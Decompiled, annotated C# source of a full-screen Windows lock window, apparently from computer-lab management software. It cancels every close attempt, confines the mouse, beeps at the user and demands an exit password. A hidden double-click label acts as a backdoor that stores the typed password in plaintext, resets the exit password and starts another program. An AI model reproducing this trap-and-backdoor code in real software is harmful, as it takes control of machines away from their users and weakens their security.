using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using OZxTKXuvsl9D34LWhP.Internal;

/// <summary>
/// 全屏"警告 + 锁屏"窗口，也是用户唯一能接触到的退出入口。
/// <para>行为链：</para>
/// <list type="bullet">
/// <item>无边框、最大化、置顶，关闭事件被无条件取消；</item>
/// <item>每秒 <c>ClipCursor(0,0,500,100)</c> 把鼠标锁在左上角，5 秒后开始蜂鸣；</item>
/// <item>输入 6 位以上密码，SHA256(输入+"bfdshgs") 与注册表 <c>HKCU\Software\n</c> 比对，
///   正确才杀 <c>jfglzsn</c>、停 <c>zmserv</c> 服务、解除鼠标锁并退出；</item>
/// <item>右上角空白标签 <c>Label_pd</c> 双击是后门：显示暗号、把输入框明文写进
///   <c>HKCU\Software\dtmm</c>、把密码重置为 111111（写 <c>czmm</c>）、启动 <c>yz.exe</c>。</item>
/// </list>
/// </summary>
// Token: 0x0200000D RID: 13
[DesignerGenerated]
public class Form2 : Form
{
	/// <summary>构造窗体，挂接关闭/加载事件并初始化控件。</summary>
	// Token: 0x06000063 RID: 99 RVA: 0x000056C0 File Offset: 0x000038C0
	public Form2()
	{
		base.FormClosing += this.禁止关闭窗体;
		base.Load += this.显示时启用定时器;
		this.初始化组件();
	}

	/// <summary>释放设计器容器中的组件。</summary>
	/// <param name="disposing">true 表示同时释放托管资源。</param>
	// Token: 0x06000064 RID: 100 RVA: 0x00005700 File Offset: 0x00003900
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && this.组件容器 != null)
			{
				this.组件容器.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	/// <summary>
	/// Designer 生成的 InitializeComponent（原名 ViewVal）：
	/// 建立密码提示、输入框、确定/重启按钮、隐藏标签 <c>Label_pd</c> 和 1000ms 定时器；
	/// 窗体蓝底、无边框、最大化、置顶、不显示在任务栏。
	/// </summary>
	// Token: 0x06000065 RID: 101 RVA: 0x00005740 File Offset: 0x00003940
	private void 初始化组件()
	{
		this.组件容器 = new Container();
		this.shuoming = new Label();
		this.Button2 = new Button();
		this.Label2 = new Label();
		this.Label1 = new Label();
		this.TextBox1 = new TextBox();
		this.Button1 = new Button();
		this.Timer_frm2 = new global::System.Windows.Forms.Timer(this.组件容器);
		this.Label_pd = new Label();
		this.shuoming2 = new Label();
		this.shuoming3 = new Label();
		base.SuspendLayout();
		this.shuoming.AutoSize = true;
		this.shuoming.Font = new Font("宋体", 26.25f, FontStyle.Regular, GraphicsUnit.Point, 134);
		this.shuoming.ForeColor = Color.Red;
		this.shuoming.Location = new Point(160, 221);
		this.shuoming.Name = "shuoming";
		this.shuoming.Size = new Size(33, 35);
		this.shuoming.TabIndex = 11;
		this.shuoming.Text = " ";
		this.Button2.Location = new Point(382, 20);
		this.Button2.Name = "Button2";
		this.Button2.Size = new Size(82, 28);
		this.Button2.TabIndex = 10;
		this.Button2.Text = "重启电脑";
		this.Button2.UseVisualStyleBackColor = true;
		this.Label2.AutoSize = true;
		this.Label2.Font = new Font("宋体", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		this.Label2.ForeColor = Color.DarkRed;
		this.Label2.Location = new Point(27, 68);
		this.Label2.Name = "Label2";
		this.Label2.Size = new Size(0, 14);
		this.Label2.TabIndex = 9;
		this.Label1.AutoSize = true;
		this.Label1.Font = new Font("宋体", 10.5f, FontStyle.Regular, GraphicsUnit.Point, 134);
		this.Label1.ForeColor = Color.White;
		this.Label1.Location = new Point(54, 26);
		this.Label1.Name = "Label1";
		this.Label1.Size = new Size(119, 14);
		this.Label1.TabIndex = 8;
		this.Label1.Text = "退出小助手密码：";
		this.TextBox1.Location = new Point(189, 22);
		this.TextBox1.Name = "TextBox1";
		this.TextBox1.PasswordChar = '*';
		this.TextBox1.Size = new Size(104, 21);
		this.TextBox1.TabIndex = 7;
		this.Button1.Location = new Point(304, 19);
		this.Button1.Name = "Button1";
		this.Button1.Size = new Size(54, 27);
		this.Button1.TabIndex = 6;
		this.Button1.Text = "确 定";
		this.Button1.UseVisualStyleBackColor = true;
		this.Timer_frm2.Interval = 1000;
		this.Label_pd.AutoSize = true;
		this.Label_pd.BackColor = SystemColors.Highlight;
		this.Label_pd.Font = new Font("宋体", 24f, FontStyle.Regular, GraphicsUnit.Point, 134);
		this.Label_pd.Location = new Point(470, 19);
		this.Label_pd.Name = "Label_pd";
		this.Label_pd.Size = new Size(95, 33);
		this.Label_pd.TabIndex = 12;
		this.Label_pd.Text = "     ";
		this.shuoming2.AutoSize = true;
		this.shuoming2.Font = new Font("宋体", 26.25f, FontStyle.Regular, GraphicsUnit.Point, 134);
		this.shuoming2.ForeColor = Color.Red;
		this.shuoming2.Location = new Point(160, 301);
		this.shuoming2.Name = "shuoming2";
		this.shuoming2.Size = new Size(33, 35);
		this.shuoming2.TabIndex = 18;
		this.shuoming2.Text = " ";
		this.shuoming3.AutoSize = true;
		this.shuoming3.Location = new Point(173, 431);
		this.shuoming3.Name = "shuoming3";
		this.shuoming3.Size = new Size(0, 12);
		this.shuoming3.TabIndex = 22;
		base.AutoScaleDimensions = new SizeF(6f, 12f);
		base.AutoScaleMode = AutoScaleMode.Font;
		this.BackColor = SystemColors.Highlight;
		base.ClientSize = new Size(918, 727);
		base.Controls.Add(this.shuoming3);
		base.Controls.Add(this.shuoming2);
		base.Controls.Add(this.Label_pd);
		base.Controls.Add(this.shuoming);
		base.Controls.Add(this.Button2);
		base.Controls.Add(this.Label2);
		base.Controls.Add(this.Label1);
		base.Controls.Add(this.TextBox1);
		base.Controls.Add(this.Button1);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Name = "Form2";
		base.ShowInTaskbar = false;
		this.Text = "Form2";
		base.TopMost = true;
		base.WindowState = FormWindowState.Maximized;
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	// Token: 0x1700001A RID: 26
	// (get) Token: 0x06000066 RID: 102 RVA: 0x00002463 File Offset: 0x00000663
	// (set) Token: 0x06000067 RID: 103 RVA: 0x0000246B File Offset: 0x0000066B
	internal virtual Label shuoming { get; set; }

	/// <summary>重启电脑按钮：每次赋值都会重新挂接 Click。</summary>
	// Token: 0x1700001B RID: 27
	// (get) Token: 0x06000068 RID: 104 RVA: 0x00002474 File Offset: 0x00000674
	// (set) Token: 0x06000069 RID: 105 RVA: 0x00005D40 File Offset: 0x00003F40
	internal virtual Button Button2
	{
		[CompilerGenerated]
		get
		{
			return this.重启按钮;
		}
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = new EventHandler(this.重启电脑);
			Button button = this.重启按钮;
			if (button != null)
			{
				button.Click -= eventHandler;
			}
			this.重启按钮 = value;
			button = this.重启按钮;
			if (button != null)
			{
				button.Click += eventHandler;
			}
		}
	}

	// Token: 0x1700001C RID: 28
	// (get) Token: 0x0600006A RID: 106 RVA: 0x0000247C File Offset: 0x0000067C
	// (set) Token: 0x0600006B RID: 107 RVA: 0x00002484 File Offset: 0x00000684
	internal virtual Label Label2 { get; set; }

	// Token: 0x1700001D RID: 29
	// (get) Token: 0x0600006C RID: 108 RVA: 0x0000248D File Offset: 0x0000068D
	// (set) Token: 0x0600006D RID: 109 RVA: 0x00002495 File Offset: 0x00000695
	internal virtual Label Label1 { get; set; }

	// Token: 0x1700001E RID: 30
	// (get) Token: 0x0600006E RID: 110 RVA: 0x0000249E File Offset: 0x0000069E
	// (set) Token: 0x0600006F RID: 111 RVA: 0x000024A6 File Offset: 0x000006A6
	internal virtual TextBox TextBox1 { get; set; }

	/// <summary>确定按钮：每次赋值都会重新挂接"校验密码"。</summary>
	// Token: 0x1700001F RID: 31
	// (get) Token: 0x06000070 RID: 112 RVA: 0x000024AF File Offset: 0x000006AF
	// (set) Token: 0x06000071 RID: 113 RVA: 0x00005D84 File Offset: 0x00003F84
	internal virtual Button Button1
	{
		[CompilerGenerated]
		get
		{
			return this.确定按钮;
		}
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = new EventHandler(this.校验退出密码);
			Button button = this.确定按钮;
			if (button != null)
			{
				button.Click -= eventHandler;
			}
			this.确定按钮 = value;
			button = this.确定按钮;
			if (button != null)
			{
				button.Click += eventHandler;
			}
		}
	}

	/// <summary>锁鼠标定时器：每次赋值都会重新挂接 Tick。</summary>
	// Token: 0x17000020 RID: 32
	// (get) Token: 0x06000072 RID: 114 RVA: 0x000024B7 File Offset: 0x000006B7
	// (set) Token: 0x06000073 RID: 115 RVA: 0x00005DC8 File Offset: 0x00003FC8
	internal virtual global::System.Windows.Forms.Timer Timer_frm2
	{
		[CompilerGenerated]
		get
		{
			return this.锁鼠标定时器;
		}
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = new EventHandler(this.定时器_锁鼠标并报警);
			global::System.Windows.Forms.Timer timer = this.锁鼠标定时器;
			if (timer != null)
			{
				timer.Tick -= eventHandler;
			}
			this.锁鼠标定时器 = value;
			timer = this.锁鼠标定时器;
			if (timer != null)
			{
				timer.Tick += eventHandler;
			}
		}
	}

	/// <summary>隐藏标签 <c>Label_pd</c>：双击触发后门。</summary>
	// Token: 0x17000021 RID: 33
	// (get) Token: 0x06000074 RID: 116 RVA: 0x000024BF File Offset: 0x000006BF
	// (set) Token: 0x06000075 RID: 117 RVA: 0x00005E0C File Offset: 0x0000400C
	internal virtual Label Label_pd
	{
		[CompilerGenerated]
		get
		{
			return this.隐藏标签;
		}
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = new EventHandler(this.隐藏标签_双击后门);
			Label label = this.隐藏标签;
			if (label != null)
			{
				label.DoubleClick -= eventHandler;
			}
			this.隐藏标签 = value;
			label = this.隐藏标签;
			if (label != null)
			{
				label.DoubleClick += eventHandler;
			}
		}
	}

	// Token: 0x17000022 RID: 34
	// (get) Token: 0x06000076 RID: 118 RVA: 0x000024C7 File Offset: 0x000006C7
	// (set) Token: 0x06000077 RID: 119 RVA: 0x000024CF File Offset: 0x000006CF
	internal virtual Label shuoming2 { get; set; }

	// Token: 0x17000023 RID: 35
	// (get) Token: 0x06000078 RID: 120 RVA: 0x000024D8 File Offset: 0x000006D8
	// (set) Token: 0x06000079 RID: 121 RVA: 0x000024E0 File Offset: 0x000006E0
	internal virtual Label shuoming3 { get; set; }

	/// <summary>Win32 <c>user32!ClipCursor</c>：把鼠标限制在指定矩形内。</summary>
	/// <param name="lpRect">屏幕坐标矩形。</param>
	// Token: 0x0600007A RID: 122
	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int ClipCursor(Form2.RECT lpRect);

	/// <summary>Win32 <c>kernel32!Beep</c>：按指定频率和时长蜂鸣。</summary>
	/// <param name="频率">蜂鸣频率（Hz）。</param>
	/// <param name="时长">持续时间（毫秒）。</param>
	// Token: 0x0600007B RID: 123
	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern long Beep(long 频率, long 时长);

	/// <summary>
	/// 退出密码校验（原名 ReflectVal，Button1.Click）。
	/// <para>
	/// 原版是 VB 的 <c>On Error Resume Next</c>：每条语句出错都被吞掉并继续下一条。
	/// 这里逐条用空 <c>catch</c> 还原，既不能合并成一个大 try，也不能删除 try。
	/// </para>
	/// 流程：长度 &lt; 6 → 提示并清空；否则 SHA256(Trim(输入)+"bfdshgs") 与
	/// <c>HKCU\Software\n</c> 比较，相等就停服务杀进程并退出，不等就提示密码错误。
	/// </summary>
	// Token: 0x0600007C RID: 124 RVA: 0x00005E50 File Offset: 0x00004050
	private void 校验退出密码(object sender, EventArgs e)
	{
		bool 密码太短 = false;
		try
		{
			密码太短 = Strings.Len(this.TextBox1.Text) < 6;
		}
		catch
		{
			// 原版 On Error Resume Next：长度取不到就按"不短"继续。
		}
		if (密码太短)
		{
			try
			{
				this.Label2.Text = "密码应该是6位以上的字母或数字，请重新输入！";
			}
			catch
			{
			}
			try
			{
				this.TextBox1.Text = "";
			}
			catch
			{
			}
			return;
		}
		string 输入摘要 = "";
		try
		{
			输入摘要 = Proccesor.计算SHA256加盐(Strings.Trim(this.TextBox1.Text));
		}
		catch
		{
		}
		string 注册表摘要 = "";
		try
		{
			注册表摘要 = Conversions.ToString(Proccesor.读取注册表值(Registry.CurrentUser, "Software", "n", ""));
		}
		catch
		{
		}
		bool 密码正确 = false;
		try
		{
			密码正确 = Operators.CompareString(输入摘要, 注册表摘要, false) == 0;
		}
		catch
		{
		}
		if (密码正确)
		{
			try
			{
				this.Label2.Text = "";
			}
			catch
			{
			}
			try
			{
				this.Button1.Enabled = false;
			}
			catch
			{
			}
			try
			{
				this.退出小助手_停服务杀进程();
			}
			catch
			{
			}
			return;
		}
		try
		{
			this.Label2.Text = "密码不正确，请重新输入！";
		}
		catch
		{
		}
		try
		{
			this.TextBox1.Text = "";
		}
		catch
		{
		}
	}

	/// <summary>
	/// 锁鼠标定时器（原名 CustomizeVal），每秒一次：
	/// 重申置顶、把鼠标锁在 (0,0)-(500,100)、计数加一，达到 5 次后
	/// 每 tick 都 <c>Beep(2000, 500)</c>，持续骚扰用户。
	/// </summary>
	// Token: 0x0600007D RID: 125 RVA: 0x00005FF0 File Offset: 0x000041F0
	private void 定时器_锁鼠标并报警(object sender, EventArgs e)
	{
		base.TopMost = true;
		Form2.RECT rect;
		rect.Left = 0;
		rect.Top = 0;
		rect.Right = 500;
		rect.Bottom = 100;
		Form2.ClipCursor(rect);
		checked
		{
			this.锁鼠标次数++;
			if (this.锁鼠标次数 >= 5)
			{
				Form2.Beep(2000L, 500L);
			}
		}
	}

	/// <summary>
	/// 隐藏后门（原名 InterruptVal，Label_pd.DoubleClick）：
	/// 显示"ngfxd568bdh158"+计算机名末字符 ASCII+"8bsdg45ybfdhg" 作为暗号；
	/// 把输入框里的**明文密码**写进 <c>HKCU\Software\dtmm</c>；
	/// 把退出密码重置为 111111（写 <c>czmm</c> = SHA256("111111"+"bfdshgs")）；
	/// 最后启动程序目录下的 <c>yz.exe</c>。
	/// 原版逐条忽略错误，这里逐条保留空 catch。
	/// </summary>
	// Token: 0x0600007E RID: 126 RVA: 0x00006060 File Offset: 0x00004260
	private void 隐藏标签_双击后门(object sender, EventArgs e)
	{
		try
		{
			this.Label2.Text = "ngfxd568bdh158" + Conversions.ToString(this.pc_num()) + "8bsdg45ybfdhg";
		}
		catch
		{
		}
		object 明文密码 = null;
		try
		{
			明文密码 = this.TextBox1.Text;
		}
		catch
		{
		}
		try
		{
			Proccesor.写入注册表值(Registry.CurrentUser, "Software", "dtmm", RuntimeHelpers.GetObjectValue(明文密码), RegistryValueKind.String);
		}
		catch
		{
		}
		object 默认密码摘要 = null;
		try
		{
			默认密码摘要 = Proccesor.计算SHA256加盐("111111");
		}
		catch
		{
		}
		try
		{
			Proccesor.写入注册表值(Registry.CurrentUser, "Software", "czmm", RuntimeHelpers.GetObjectValue(默认密码摘要), RegistryValueKind.String);
		}
		catch
		{
		}
		try
		{
			NewLateBinding.LateCall(null, typeof(Process), "Start", new object[] { Operators.ConcatenateObject(Proccesor.程序所在目录, "\\yz.exe") }, null, null, null, true);
		}
		catch
		{
		}
	}

	/// <summary>
	/// 退出收尾（原名 RestartVal）：密码正确后调用。
	/// <list type="number">
	/// <item>循环杀 <c>jfglzsn</c>：先 <c>[0].Kill()</c>，进程不存在时下标越界由空 catch 吞掉，
	///   再判断 <c>Length == 0</c> 才 <c>break</c>，否则 <c>Sleep(500)</c>；</item>
	/// <item>把 <c>DisableCMD</c> 写回 0（重新允许 cmd）；</item>
	/// <item><c>net stop zmserv</c> 并等待完成，再 Sleep 3000；</item>
	/// <item>杀 <c>zmserv</c> 进程（同样靠吞异常处理进程不存在）；</item>
	/// <item>把鼠标范围恢复成整屏，<c>ProjectData.EndApp()</c> 结束程序。</item>
	/// </list>
	/// 原版每条语句都是 <c>On Error Resume Next</c>，这里逐条保留空 catch。
	/// </summary>
	// Token: 0x0600007F RID: 127 RVA: 0x000061B0 File Offset: 0x000043B0
	private void 退出小助手_停服务杀进程()
	{
		string 服务名 = "zmserv";
		string 进程名 = "jfglzsn";
		while (true)
		{
			Process[] processesByName = null;
			try
			{
				processesByName = Process.GetProcessesByName(进程名);
			}
			catch
			{
			}
			try
			{
				processesByName[0].Kill();
			}
			catch
			{
			}
			try
			{
				if (processesByName.Length == 0)
				{
					break;
				}
			}
			catch
			{
			}
			try
			{
				Thread.Sleep(500);
			}
			catch
			{
			}
		}
		try
		{
			Proccesor.写入注册表值(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord);
		}
		catch
		{
		}
		try
		{
			Interaction.Shell("net stop zmserv", AppWinStyle.Hide, true, -1);
		}
		catch
		{
		}
		try
		{
			Thread.Sleep(3000);
		}
		catch
		{
		}
		Process[] processesByName2 = null;
		try
		{
			processesByName2 = Process.GetProcessesByName(服务名);
		}
		catch
		{
		}
		try
		{
			processesByName2[0].Kill();
		}
		catch
		{
		}
		Form2.RECT rect;
		rect.Left = 0;
		rect.Top = 0;
		rect.Right = Screen.PrimaryScreen.Bounds.Width;
		rect.Bottom = Screen.PrimaryScreen.Bounds.Height;
		try
		{
			Form2.ClipCursor(rect);
		}
		catch
		{
		}
		try
		{
			ProjectData.EndApp();
		}
		catch
		{
		}
	}

	/// <summary>无条件取消关闭（原名 ReadVal）：Alt+F4、关闭按钮全部无效。</summary>
	// Token: 0x06000080 RID: 128 RVA: 0x000024E9 File Offset: 0x000006E9
	private void 禁止关闭窗体(object sender, FormClosingEventArgs e)
	{
		e.Cancel = true;
	}

	/// <summary>窗体显示时启动锁鼠标定时器（原名 CancelVal）。</summary>
	// Token: 0x06000081 RID: 129 RVA: 0x000024F2 File Offset: 0x000006F2
	private void 显示时启用定时器(object sender, EventArgs e)
	{
		this.Timer_frm2.Enabled = true;
	}

	/// <summary>
	/// 重启电脑按钮（原名 ComputeVal）：<c>shutdown /r /f /t 0</c>。
	/// 保留 <c>Interaction.Shell</c> 的窗口样式与"等待"语义，不能换成 Process.Start。
	/// </summary>
	// Token: 0x06000082 RID: 130 RVA: 0x0000639C
	private void 重启电脑(object sender, EventArgs e)
	{
		try
		{
			Interaction.Shell("shutdown /r /f /t 0", AppWinStyle.MinimizedFocus, false, -1);
		}
		catch
		{
			// 原版 On Error Resume Next。
		}
	}

	/// <summary>
	/// 取机器码后缀（原名 pc_num）：环境变量 <c>COMPUTERNAME</c> 最后一个字符的 ASCII；
	/// 空字符串返回 88。计算机名不存在时原版会因 <c>Length</c> 抛异常，这里照原样保留。
	/// </summary>
	// Token: 0x06000083 RID: 131 RVA: 0x00006434 File Offset: 0x00004634
	public int pc_num()
	{
		string 计算机名 = Environment.GetEnvironmentVariable("COMPUTERNAME");
		int 末字符ASCII;
		if (计算机名.Length > 0)
		{
			末字符ASCII = Strings.Asc(计算机名[checked(计算机名.Length - 1)]);
		}
		else
		{
			末字符ASCII = 88;
		}
		return 末字符ASCII;
	}

	/// <summary>设计器组件容器（原名 m_Authentication）。</summary>
	// Token: 0x04000031 RID: 49
	private IContainer 组件容器;

	/// <summary>shuoming 的 Designer 后备字段（原名 @ref，未直接使用）。</summary>
	// Token: 0x04000032 RID: 50
	[CompilerGenerated]
	[AccessedThroughProperty("shuoming")]
	private Label shuoming后备字段;

	/// <summary>重启按钮的后备字段（原名 _Invocation）。</summary>
	// Token: 0x04000033 RID: 51
	[CompilerGenerated]
	[AccessedThroughProperty("Button2")]
	private Button 重启按钮;

	/// <summary>Label2 的 Designer 后备字段（原名 _Server，未直接使用）。</summary>
	// Token: 0x04000034 RID: 52
	[CompilerGenerated]
	[AccessedThroughProperty("Label2")]
	private Label Label2后备字段;

	/// <summary>Label1 的 Designer 后备字段（原名 _State，未直接使用）。</summary>
	// Token: 0x04000035 RID: 53
	[CompilerGenerated]
	[AccessedThroughProperty("Label1")]
	private Label Label1后备字段;

	/// <summary>TextBox1 的 Designer 后备字段（原名 decorator，未直接使用）。</summary>
	// Token: 0x04000036 RID: 54
	[AccessedThroughProperty("TextBox1")]
	[CompilerGenerated]
	private TextBox TextBox1后备字段;

	/// <summary>确定按钮的后备字段（原名 m_Mapping）。</summary>
	// Token: 0x04000037 RID: 55
	[CompilerGenerated]
	[AccessedThroughProperty("Button1")]
	private Button 确定按钮;

	/// <summary>锁鼠标定时器的后备字段（原名 m_Merchant）。</summary>
	// Token: 0x04000038 RID: 56
	[CompilerGenerated]
	[AccessedThroughProperty("Timer_frm2")]
	private global::System.Windows.Forms.Timer 锁鼠标定时器;

	/// <summary>隐藏标签的后备字段（原名 tests）。</summary>
	// Token: 0x04000039 RID: 57
	[AccessedThroughProperty("Label_pd")]
	private Label 隐藏标签;

	/// <summary>shuoming2 的 Designer 后备字段（原名 m_Interpreter，未直接使用）。</summary>
	// Token: 0x0400003A RID: 58
	[AccessedThroughProperty("shuoming2")]
	[CompilerGenerated]
	private Label shuoming2后备字段;

	/// <summary>shuoming3 的 Designer 后备字段（原名 _Prototype，未直接使用）。</summary>
	// Token: 0x0400003B RID: 59
	[CompilerGenerated]
	[AccessedThroughProperty("shuoming3")]
	private Label shuoming3后备字段;

	/// <summary>定时器已触发的次数（原名 _Mock）。</summary>
	// Token: 0x0400003C RID: 60
	private int 锁鼠标次数;

	/// <summary>Win32 <c>ClipCursor</c> 使用的屏幕矩形。</summary>
	// Token: 0x0200000E RID: 14
	public struct RECT
	{
		// Token: 0x0400003D RID: 61
		public int Left;

		// Token: 0x0400003E RID: 62
		public int Top;

		// Token: 0x0400003F RID: 63
		public int Right;

		// Token: 0x04000040 RID: 64
		public int Bottom;
	}
}
